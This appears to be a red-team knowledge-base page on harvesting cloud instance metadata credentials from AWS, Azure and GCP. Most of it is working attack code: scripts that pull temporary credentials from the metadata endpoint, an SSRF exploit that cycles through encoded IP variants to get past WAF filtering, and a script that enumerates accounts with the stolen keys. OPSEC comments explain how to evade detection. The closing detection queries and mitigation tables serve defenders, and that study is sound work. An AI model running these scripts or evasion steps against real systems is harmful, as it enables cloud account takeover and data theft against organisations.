# IMDS Token Theft -- Cloud Instance Metadata Credential Harvesting

**MITRE ATT&CK**: T1552.005 - Unsecured Credentials: Cloud Instance Metadata API

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

Every major cloud provider exposes an **Instance Metadata Service (IMDS)** on a
link-local address (`169.254.169.254` or a DNS alias) that returns temporary
credentials to any process on the VM. When an attacker reaches the IMDS --
typically through SSRF -- they obtain cloud API credentials without a password.

## IMDS Architecture by Cloud Provider

### AWS -- IMDSv1 and IMDSv2

```
# IMDSv1 (no auth)
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# IMDSv2 (PUT for session token first)
PUT http://169.254.169.254/latest/api/token  [X-aws-ec2-metadata-token-ttl-seconds: 21600]
```

IMDSv2 sets a **TTL hop limit of 1**, blocking requests that traverse a Docker
bridge. Containers with `--network=host` bypass this since they share the host
network namespace.

### Azure -- Managed Identity Endpoint

```
GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Metadata: true
```

The `Metadata: true` header is Azure's anti-SSRF control. SSRF sinks that allow
header injection bypass it.

### GCP -- Metadata Server

```
GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Metadata-Flavor: Google
```

| Cloud | Token Type | Lifetime | Contents |
|---|---|---|---|
| AWS | STS temporary credentials | 1-12 h | AccessKeyId, SecretAccessKey, Token |
| Azure | JWT access token | ~1 h | oid, tid, roles, scope |
| GCP | OAuth2 access token | ~1 h | opaque bearer token |

## Python -- Multi-Cloud IMDS Query

```python
"""
imds_query.py -- Query IMDS across AWS, Azure, and GCP.
DETECTION: Use of returned creds from a non-instance IP generates CloudTrail/
Azure sign-in/GCP audit log mismatches. Defenders monitor for AssumeRole from
unexpected IPs, atypical-travel alerts, and metadata server audit entries.
OPSEC: Use stolen tokens from within the same VPC/region to avoid geographic
anomaly detections. Reuse IMDSv2 session tokens to minimise PUT call volume.
"""
import requests, json, sys

def query_aws_imds_v2(role_name: str) -> dict:
    # DETECTION: CloudTrail AssumeRole sourceIPAddress mismatch is high-fidelity.
    # OPSEC: Minimise PUT calls; host agents (Falco, Sysdig) log them.
    token = requests.put("http://169.254.169.254/latest/api/token",
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, timeout=2).text
    return requests.get(
        f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}",
        headers={"X-aws-ec2-metadata-token": token}, timeout=2).json()

def query_azure_imds(resource="https://management.azure.com/") -> dict:
    # DETECTION: Azure sign-in log flags token use from non-Azure IP.
    # OPSEC: Metadata:true header is a weak control -- header-injection bypasses it.
    return requests.get(
        f"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource={resource}",
        headers={"Metadata": "true"}, timeout=2).json()

def query_gcp_metadata() -> dict:
    # DETECTION: Data Access audit logs record metadata queries.
    # OPSEC: GCP tokens are opaque; use tokeninfo endpoint to check scope first.
    return requests.get(
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        headers={"Metadata-Flavor": "Google"}, timeout=2).json()

if __name__ == "__main__":
    provider = sys.argv[1] if len(sys.argv) > 1 else "aws"
    if provider == "aws":
        t = requests.put("http://169.254.169.254/latest/api/token",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"}, timeout=2).text
        role = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            headers={"X-aws-ec2-metadata-token": t}, timeout=2).text.strip()
        print(json.dumps(query_aws_imds_v2(role), indent=2))
    elif provider == "azure":
        print(json.dumps(query_azure_imds(), indent=2))
    elif provider == "gcp":
        print(json.dumps(query_gcp_metadata(), indent=2))
```

## Python -- SSRF-to-IMDS Exploitation

```python
"""
ssrf_to_imds.py -- SSRF exploitation to reach IMDS.
DETECTION: WAF rules blocking 169.254.169.254; VPC Flow Logs showing link-local dest.
OPSEC: Use IP encoding variants to bypass naive WAF (hex, decimal, IPv6-mapped).
"""
import requests

VULN_APP = "https://target-app.example.com/api/preview"

def exploit_ssrf_aws(vuln_url: str) -> dict:
    # DETECTION: VPC Flow Logs destination 169.254.169.254; CloudTrail IP mismatch.
    # OPSEC: IMDSv1 needs only GET (no PUT); simpler through most SSRF sinks.
    imds = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    role = requests.post(vuln_url, json={"url": imds}, timeout=10).text.strip()
    return requests.post(vuln_url, json={"url": f"{imds}{role}"}, timeout=10).json()

def exploit_ssrf_with_ip_obfuscation(vuln_url: str) -> str:
    # DETECTION: Advanced WAFs normalise IP representations before matching.
    # OPSEC: Test each encoding in lab first -- behaviour varies by HTTP library.
    for enc in ["http://169.254.169.254/", "http://0xA9FEA9FE/",
                "http://2852039166/", "http://[::ffff:169.254.169.254]/"]:
        try:
            r = requests.post(vuln_url, json={"url": enc + "latest/meta-data/"}, timeout=5)
            if r.status_code == 200 and "iam" in r.text:
                return f"Bypass succeeded: {enc}"
        except requests.RequestException:
            continue
    return "All bypass attempts failed"
```

## Bash -- Quick IMDS Queries

```bash
#!/usr/bin/env bash
# DETECTION: curl to 169.254.169.254 triggers Falco "Contact EC2 Instance Metadata Service".
# OPSEC: Use compiled binary or Python to avoid shell history / process tree visibility.

# AWS IMDSv2
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  -H "X-aws-ec2-metadata-token: $TOKEN")
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" \
  -H "X-aws-ec2-metadata-token: $TOKEN" | python3 -m json.tool

# Azure
curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true" | python3 -m json.tool

# GCP
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google" | python3 -m json.tool
```

## Post-Exploitation with Stolen Tokens

```python
"""
post_exploit.py -- Enumerate the cloud environment with stolen IMDS credentials.
DETECTION: GuardDuty InstanceCredentialExfiltration.OutsideAWS; sourceIPAddress mismatch.
OPSEC: Proxy API calls through the compromised instance (SSH tunnel / SOCKS proxy).
"""
import boto3

def enumerate_aws(access_key, secret_key, session_token):
    # DETECTION: GetCallerIdentity -> ListBuckets -> ListUsers burst is a strong signal.
    session = boto3.Session(aws_access_key_id=access_key,
        aws_secret_access_key=secret_key, aws_session_token=session_token)
    sts = session.client("sts")
    identity = sts.get_caller_identity()
    print(f"Account: {identity['Account']}, ARN: {identity['Arn']}")
    for b in session.client("s3").list_buckets().get("Buckets", []):
        print(f"  Bucket: {b['Name']}")
    try:
        print(f"  IAM users: {len(session.client('iam').list_users()['Users'])}")
    except Exception:
        print("  IAM enumeration denied")
```

## IMDSv2 Hop Limit -- Container Bypass

Containers with `--network=host`, ECS `awsvpc` tasks, and EKS pods with
`hostNetwork: true` share the host network namespace, so the hop-limit-1
mitigation does not apply. Verify from inside a container:

```bash
curl -s --max-time 2 -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 60" && echo "IMDSv2 reachable"
```

## Azure Managed Identity MSP -- 2025 Mitigation

Microsoft's **Metadata Security Protocol (MSP)** binds token requests to a
platform-signed VM attestation, preventing SSRF-sourced requests from obtaining
tokens. However, MSP requires opt-in and an updated Azure agent; the majority
of production workloads have not enabled it as of late 2025.

## React2Shell -- CVE-2025-55182

A React SSR vulnerability (CVE-2025-55182) turned front-end XSS into server-side
SSRF, harvesting IMDS tokens across AWS, Azure, and GCP from a single exploit
chain. It accelerated IMDSv2 enforcement and Azure MSP adoption.

## Detection Indicators

| Indicator | Source | Notes |
|---|---|---|
| `AssumeRole` from non-instance IP | AWS CloudTrail | High fidelity |
| GuardDuty `InstanceCredentialExfiltration.OutsideAWS` | AWS GuardDuty | Fires when creds leave AWS |
| Sign-in from non-Azure IP for managed identity | Azure AD Sign-in Logs | Filter on managedIdentity |
| Outbound connection to `169.254.169.254` | VPC Flow Logs / host FW | Only cloud platform processes should connect |
| Rapid `GetCallerIdentity` -> `ListBuckets` -> `ListUsers` | CloudTrail | Classic post-theft enumeration |
| Curl/wget to link-local IP | Host EDR (Falco, Sysdig) | Falco rule: "Contact EC2 Instance Metadata Service" |

```sql
-- Athena: detect IMDS credential use from external IPs
SELECT eventtime, sourceipaddress, eventname, useridentity.arn
FROM cloudtrail_logs
WHERE useridentity.type = 'AssumedRole'
  AND sourceipaddress NOT LIKE '10.%' AND sourceipaddress NOT LIKE '172.%'
  AND eventname IN ('GetCallerIdentity','ListBuckets','ListUsers')
ORDER BY eventtime DESC LIMIT 50;
```

```kql
// Sentinel: detect managed identity use from non-Azure IPs
SigninLogs
| where AuthenticationDetails contains "managedIdentity"
| where IPAddress !startswith "10." and IPAddress !startswith "172."
| project TimeGenerated, Identity, IPAddress, AppDisplayName, ResourceDisplayName
```

## Mitigation Summary

| Control | Cloud | Effect |
|---|---|---|
| Enforce IMDSv2 (disable IMDSv1) | AWS | Requires PUT + session token; blocks simple SSRF |
| Set hop limit to 1 | AWS | Blocks container SSRF across Docker bridge |
| Enable Managed Identity MSP | Azure | Binds token to platform attestation |
| Restrict Metadata header at WAF | Azure/GCP | Prevents header-injection SSRF bypass |
| Block link-local IPs in iptables | All | Prevents non-root processes from reaching IMDS |
| GuardDuty / Defender / SCC alerts | All | Detects credential use from unexpected sources |

## Cross-References

- [AWS Initial Access Narrative](../../13-cloud-security/aws/aws-initial-access.md)
- [Azure AD Attack Narrative](../../13-cloud-security/azure/azure-ad-attacks.md)
- [GCP Privilege Escalation](../../13-cloud-security/gcp/gcp-privesc.md)
- [Cloud C2 Channels](cloud-c2-channels.md) -- using stolen credentials for persistence
- [OAuth Token Abuse](oauth-token-abuse.md) -- complementary token theft via OAuth flows

---
*Red team knowledge base -- authorized testing only.*
